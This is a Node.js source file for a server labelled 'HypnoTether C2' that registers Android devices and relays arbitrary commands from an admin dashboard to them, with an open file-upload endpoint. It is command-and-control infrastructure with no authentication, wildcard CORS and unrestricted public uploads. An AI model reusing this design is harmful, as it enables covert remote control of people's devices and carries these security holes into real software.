const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: '*' }
});

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.use(express.json());

// Ensure uploads directory exists
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)){
    fs.mkdirSync(uploadDir);
}

// Multer Storage Configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

// Tracking Connected Devices
// In-memory data structure: { socketId: { id: "Sub-A3B9", os: "Android", lastSeen: timestamp } }
const connectedDevices = {};

// File Upload Endpoint
app.post('/api/upload', upload.single('media'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
    const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
    res.json({ success: true, url: fileUrl, type: req.file.mimetype });
});

// Socket.IO Communication
io.on('connection', (socket) => {
    console.log(`[C2] New Connection: ${socket.id}`);

    // Device Handshake (Client announces itself)
    socket.on('register_device', (data) => {
        connectedDevices[socket.id] = {
            socketId: socket.id,
            id: data.deviceId || `Sub-${socket.id.substring(0, 4).toUpperCase()}`,
            model: data.model || 'Unknown Android',
            connectedAt: new Date()
        };
        console.log(`[C2] Device Registered: ${connectedDevices[socket.id].id}`);
        // Broadcast updated device list to Admins (Dashboard)
        io.emit('device_list_update', Object.values(connectedDevices));
    });

    // Admin identifying as dashboard
    socket.on('admin_join', () => {
        socket.join('admins');
        socket.emit('device_list_update', Object.values(connectedDevices));
    });

    // Relay commands from Admin to specific Device
    socket.on('send_command', (data) => {
        // data: { target: socketId, command: "vibrate", payload: {...} }
        const { target, command, payload } = data;
        if (target && target !== 'all') {
            io.to(target).emit(command, payload);
            console.log(`[C2] Sent '${command}' to ${target}`);
        } else {
            // Broadcast to everyone except admins
            socket.broadcast.emit(command, payload);
             console.log(`[C2] Sent '${command}' to everyone`);
        }
    });

    socket.on('disconnect', () => {
        console.log(`[C2] Disconnected: ${socket.id}`);
        if (connectedDevices[socket.id]) {
            delete connectedDevices[socket.id];
            io.emit('device_list_update', Object.values(connectedDevices));
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[HypnoTether C2] Server running on port ${PORT}`);
});
